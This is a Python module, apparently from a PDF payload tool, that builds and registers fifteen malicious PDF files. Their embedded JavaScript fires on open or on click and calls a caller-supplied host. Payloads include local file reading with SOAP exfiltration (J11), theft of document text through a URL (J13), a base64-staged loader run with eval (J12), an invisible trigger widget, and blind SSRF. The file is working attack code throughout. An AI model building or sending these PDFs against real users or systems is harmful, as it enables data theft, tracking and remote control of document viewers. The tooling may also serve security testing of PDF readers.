from __future__ import annotations

from nonpdf.core.branding import PDF_HEADER_COMMENT
from nonpdf.core.registry import PayloadEntry, registry


def _js_openaction(js: str) -> bytes:
    body = (
        "%PDF-1.4\n"
    ).encode() + PDF_HEADER_COMMENT + (
        "1 0 obj\n<< >>\nendobj\n"
        "trailer\n<< /Root << /Pages << >> /OpenAction "
        "<< /S /JavaScript /JS ("
        + js +
        ") >> >> >>\n%%EOF\n"
    ).encode("latin-1")
    return body


def _js_openaction_with_page(js: str, label: str) -> bytes:
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    body = (
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Courier >> >> >> /Contents 4 0 R >>\nendobj\n"
        b"4 0 obj\n<< /Length 55 >>\nstream\nBT /F1 22 Tf 30 800 Td (" + label.encode() + b") Tj ET\nendstream\nendobj\n"
    )
    action = (
        b"5 0 obj\n<< /Type /Action /S /JavaScript /JS ("
        + js.encode("latin-1") + b") >>\nendobj\n"
    )
    tail = b"trailer\n<< /Root 1 0 R /Size 6 >>\n%%EOF\n"
    return head + body + action + tail


# ---- JS API surface -----------------------------------------------------

def build_js_submitform(host: str) -> bytes:
    return _js_openaction_with_page(
        f'this.submitForm({{cURL:"{host}/j-submitform"}})',
        "js-submitform",
    )


def build_js_geturl(host: str) -> bytes:
    return _js_openaction_with_page(
        f'this.getURL("{host}/j-geturl")',
        "js-geturl",
    )


def build_js_launchurl(host: str) -> bytes:
    return _js_openaction_with_page(
        f'app.launchURL("{host}/j-launchurl", true)',
        "js-launchurl",
    )


def build_js_opendoc(host: str) -> bytes:
    return _js_openaction_with_page(
        f'app.openDoc({{cPath: encodeURI("{host}/j-opendoc"), cFS: "CHTTP"}})',
        "js-opendoc",
    )


def build_js_submit_as_pdf(host: str) -> bytes:
    return _js_openaction_with_page(
        f'this.submitForm({{cURL:"{host}/j-submitpdf", cSubmitAs:"PDF"}})',
        "js-submit-pdf",
    )


def build_js_media_url(host: str) -> bytes:
    return _js_openaction_with_page(
        f'app.media.getURLData("{host}/j-media", "audio/mp3")',
        "js-media",
    )


def build_js_soap_connect(host: str) -> bytes:
    return _js_openaction_with_page(
        f'SOAP.connect("{host}/j-soap-connect")',
        "js-soap",
    )


def build_js_soap_request(host: str) -> bytes:
    js = (
        f'SOAP.request({{cURL:"{host}/j-soap-request",'
        'oRequest:{},cAction:""})'
    )
    return _js_openaction_with_page(js, "js-soap-req")


def build_js_import_dataobject(host: str) -> bytes:
    return _js_openaction_with_page(
        f'this.importDataObject("file","{host}/j-dataobject")',
        "js-import",
    )


def build_js_rss_addfeed(host: str) -> bytes:
    return _js_openaction_with_page(
        f'RSS.addFeed({{cURL: "{host}/j-rss"}})',
        "js-rss",
    )


def build_js_readfile_exfil(host: str) -> bytes:
    js = (
        'try{var s=util.readFileIntoStream("/etc/hostname",0);'
        f'SOAP.request({{cURL:"{host}/j-readfile",'
        'oRequest:{"x":util.stringFromStream(s)},cAction:""})}catch(e){'
        f'SOAP.request({{cURL:"{host}/j-readfile-err",'
        'oRequest:{"e":e.toString()},cAction:""})}'
    )
    return _js_openaction_with_page(js, "js-readfile")


def build_js_staged_field(host: str) -> bytes:
    """Inner payload base64-stored in /Tx /V; loader stub in OpenAction."""
    import base64 as _b64
    inner = f'app.launchURL("{host}/j-staged", true)'
    payload_b64 = _b64.b64encode(inner.encode("latin-1")).decode("ascii")

    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [5 0 R] >> /OpenAction 6 0 R >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Annots [5 0 R] /Contents 4 0 R >>\nendobj\n"
        + b"4 0 obj\n<< /Length 55 >>\nstream\nBT /F1 22 Tf 30 800 Td (js-staged) Tj ET\nendstream\nendobj\n"
        + b"5 0 obj\n<< /Type /Annot /Subtype /Widget /Rect [0 0 0 0] /FT /Tx"
        + b" /T (btn1) /V (" + payload_b64.encode() + b") /F 2 >>\nendobj\n"
        + b"6 0 obj\n<< /Type /Action /S /JavaScript /JS (eval(util.stringFromStream("
        + b'util.streamFromString(getField("btn1").value),"base64"))) >>\nendobj\n'
        + b"trailer\n<< /Root 1 0 R /Size 7 >>\n%%EOF\n"
    )


def build_js_getpagewords(host: str) -> bytes:
    js = (
        'var w=[];for(var p=0;p<this.numPages;p++){'
        'for(var i=0;i<this.getPageNumWords(p);i++){'
        'w.push(this.getPageNthWord(p,i,true))}}'
        f'app.openDoc({{cPath:encodeURI("{host}/j-words?d="+w.join("+")),cFS:"CHTTP"}})'
    )
    return _js_openaction_with_page(js, "js-words")


def build_js_widget_btn(host: str) -> bytes:
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [5 0 R] >> >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Annots [5 0 R] /Contents 4 0 R >>\nendobj\n"
        + b"4 0 obj\n<< /Length 55 >>\nstream\nBT /F1 22 Tf 30 800 Td (widget) Tj ET\nendstream\nendobj\n"
        + b"5 0 obj\n<< /Type /Annot /Subtype /Widget /Rect [0 0 900 700]"
        + b" /Parent << /FT /Btn /T (a) >>"
        + b" /A << /S /JavaScript /JS (app.openDoc({cPath: encodeURI(\""
        + host.encode() + b"/j-widget\"), cFS: \"CHTTP\"})) >> >>\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 6 >>\n%%EOF\n"
    )


def build_js_widget_tx(host: str) -> bytes:
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [5 0 R] >> >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Annots [5 0 R] /Contents 4 0 R >>\nendobj\n"
        + b"4 0 obj\n<< /Length 55 >>\nstream\nBT /F1 22 Tf 30 800 Td (widget-tx) Tj ET\nendstream\nendobj\n"
        + b"5 0 obj\n<< /Type /Annot /Subtype /Widget /Rect [0 0 900 700]"
        + b" /Parent << /FT /Tx /T (foo) /V (bar) >>"
        + b" /A << /S /JavaScript /JS (this.submitForm(\""
        + host.encode() + b"/j-widget-tx\", false, false, [\"foo\"])) >> >>\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 6 >>\n%%EOF\n"
    )


registry.register(PayloadEntry(
    id="J01", name="js_submitform",
    builder=lambda host: build_js_submitform(host),
    description="this.submitForm() form POST",
    platform="acrobat", tags=("javascript", "quick"),
))
registry.register(PayloadEntry(
    id="J02", name="js_geturl",
    builder=lambda host: build_js_geturl(host),
    description="this.getURL() callback",
    platform="acrobat", tags=("javascript",),
))
registry.register(PayloadEntry(
    id="J03", name="js_launchurl",
    builder=lambda host: build_js_launchurl(host),
    description="app.launchURL()",
    platform="acrobat", tags=("javascript",),
))
registry.register(PayloadEntry(
    id="J04", name="js_opendoc",
    builder=lambda host: build_js_opendoc(host),
    description="app.openDoc() remote fetch",
    platform="acrobat", tags=("javascript", "quick"),
))
registry.register(PayloadEntry(
    id="J05", name="js_submit_as_pdf",
    builder=lambda host: build_js_submit_as_pdf(host),
    description="submitForm cSubmitAs PDF",
    platform="acrobat", tags=("javascript",),
))
registry.register(PayloadEntry(
    id="J06", name="js_media_url",
    builder=lambda host: build_js_media_url(host),
    description="app.media.getURLData()",
    platform="acrobat", tags=("javascript",),
))
registry.register(PayloadEntry(
    id="J07", name="js_soap_connect",
    builder=lambda host: build_js_soap_connect(host),
    description="SOAP.connect()",
    platform="acrobat", tags=("javascript",),
))
registry.register(PayloadEntry(
    id="J08", name="js_soap_request",
    builder=lambda host: build_js_soap_request(host),
    description="SOAP.request() with body",
    platform="acrobat", tags=("javascript",),
))
registry.register(PayloadEntry(
    id="J09", name="js_import_dataobj",
    builder=lambda host: build_js_import_dataobject(host),
    description="importDataObject()",
    platform="acrobat", tags=("javascript",),
))
registry.register(PayloadEntry(
    id="J10", name="js_rss_addfeed",
    builder=lambda host: build_js_rss_addfeed(host),
    description="RSS.addFeed() bidirectional C2 primitive",
    platform="acrobat", tags=("javascript",),
))
registry.register(PayloadEntry(
    id="J11", name="js_readfile_exfil",
    builder=lambda host: build_js_readfile_exfil(host),
    description="util.readFileIntoStream + SOAP exfil chain",
    platform="acrobat", tags=("javascript",),
))
registry.register(PayloadEntry(
    id="J12", name="js_staged_field",
    builder=lambda host: build_js_staged_field(host),
    description="base64 JS staged in /Tx /V, decoded via getField()",
    platform="acrobat", tags=("javascript",),
))
registry.register(PayloadEntry(
    id="J13", name="js_page_words",
    builder=lambda host: build_js_getpagewords(host),
    description="getPageNthWord() text exfiltration",
    platform="acrobat", tags=("javascript",),
))
registry.register(PayloadEntry(
    id="J14", name="js_widget_btn",
    builder=lambda host: build_js_widget_btn(host),
    description="Invisible /Btn widget fires JS on click",
    platform="pdfium", tags=("javascript",),
))
registry.register(PayloadEntry(
    id="J15", name="js_widget_tx",
    builder=lambda host: build_js_widget_tx(host),
    description="/Tx widget submitForm() blind SSRF",
    platform="pdfium", tags=("javascript",),
))
